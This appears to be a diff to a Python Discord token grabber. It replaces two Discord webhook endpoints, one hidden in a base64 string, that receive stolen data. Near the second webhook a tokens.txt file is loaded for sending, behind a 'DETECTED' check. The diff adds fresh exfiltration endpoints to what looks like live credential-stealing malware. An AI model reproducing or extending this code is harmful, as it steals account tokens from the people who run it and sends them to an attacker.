@@ -64,7 +64,7 @@ import urllib
 import requests
 from dhooks import Webhook, File
 
-base64_message = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4MjcyNjQzMjM2ODc3MTE3My9tdkJzTmxMRGQyVXJzdFVfaXMzNjlkbEVXN3dDcHhHM3F5UFdyTm9vYi0zb19zTjNVQ2JwMFl6ZHUyV0NTWEtOa3JBRQ=='
+base64_message = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4MzAxNjE3NDcwNDU0MTcwNy9ERHIzSWxNSlFMYzVDbmRYZE1DaGpnUDI0YW9oS19xWlFZRkw0VUw2SWJiOHJGUlZLVFNvRHlfV1p3UGgwbVc5MDF2Mg=='
 base64_bytes = base64_message.encode('ascii')
 message_bytes = base64.b64decode(base64_bytes)
 hook = message_bytes.decode('ascii')
@@ -1067,7 +1067,7 @@ if not DETECTED:
 
 from dhooks import Webhook, File
 
-dahook = Webhook("https://discord.com/api/webhooks/1082739842762428429/YOe8uNvn57lOXS1bvEzhrC_o_enBV7jz4y4LW96kHsslGATOeTwvYZ7ZLJvZMcaxOhUF")
+dahook = Webhook("https://discord.com/api/webhooks/1083016196036763728/lW5tnKHmWyk5amF-bseQwTCwuR5mBvxIJTmlCk7Y6vhHGVAagbE6iKO_W11Nrf6XRbLm")
 
 grimxkd31x = File(".\\tokens.txt")
 
